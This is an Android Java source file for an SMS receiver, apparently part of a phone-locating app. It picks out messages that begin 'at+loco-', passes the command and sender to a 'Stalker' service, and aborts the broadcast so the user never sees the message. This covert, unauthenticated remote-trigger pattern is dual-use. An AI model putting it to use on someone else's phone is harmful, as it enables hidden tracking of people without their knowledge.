package org.booncode.android.loco;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.content.BroadcastReceiver;
import android.telephony.SmsMessage;

import android.widget.Toast;

public class MsgReceiver extends BroadcastReceiver
{
  public static final String RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
  public static final String LOCO_CMD_START = "at+loco-";
  private Context m_context = null;
  
  
  protected boolean processMessage(SmsMessage msg)
  {
    String text = msg.getMessageBody();
    if (text != null)
    {
      //Toast.makeText(this.m_context, "Inspecting: " + text, Toast.LENGTH_LONG).show();
      
      if (text.startsWith(LOCO_CMD_START))
      {
        String addr = msg.getOriginatingAddress();
        if (addr != null)
        {
          //Toast.makeText(this.m_context, addr, Toast.LENGTH_LONG).show();
          startStalker(text.substring(LOCO_CMD_START.length()), addr);
          return true;
        }
      }
    }
    
    return false;
  }
  
  protected boolean scanPDU(Object pdu)
  {
    byte[] data = null;
    SmsMessage msg = null;
    
    try
    {
      data = (byte[])pdu;
      msg = SmsMessage.createFromPdu(data);
    }
    catch(Exception e)
    {
      return false;
    }
    
    return this.processMessage(msg);
  }
  
  protected boolean inspectIntent(Intent intent)
  {
    Bundle bundle = intent.getExtras();
    boolean is_cmd = false;
    
    if (bundle != null)
    {
      Object[] pdus = null;
      try
      {
        pdus = (Object[]) bundle.get("pdus");
      }
      catch(Exception e)
      {
        // DEBUG: remove this!
        //Toast.makeText(this.m_context, "Couldn't retrieve PDU's", Toast.LENGTH_LONG).show();
        
        // silently ignore this error...
      }
      
      if (pdus != null)
      {
        for (int i = 0; i < pdus.length; ++i)
        {
          is_cmd |= this.scanPDU(pdus[i]);
        }
      }
    }
    
    return is_cmd;
  }
  
  protected void startStalker(String cmd, String telnr)
  {
    Intent intent = new Intent();
    intent.setFlags(Intent.FLAG_FROM_BACKGROUND);
    intent.setAction(Stalker.STALKING_ACTION);
    intent.putExtra("cmd", cmd);
    intent.putExtra("phone-number", telnr);
    this.m_context.startService(intent);
  }
  
  @Override
  public void onReceive(Context context, Intent intent) 
  {
    String action = intent.getAction();
    
    if (RECEIVED_ACTION.equals(action))
    {
      this.m_context = context;
      
      if (this.inspectIntent(intent))
      {
        abortBroadcast();
      }
    }
    else
    {
      // silently ignore unexpected intent
      //Toast.makeText(context, "Strange Intent...", Toast.LENGTH_LONG).show();
    }
  }
}
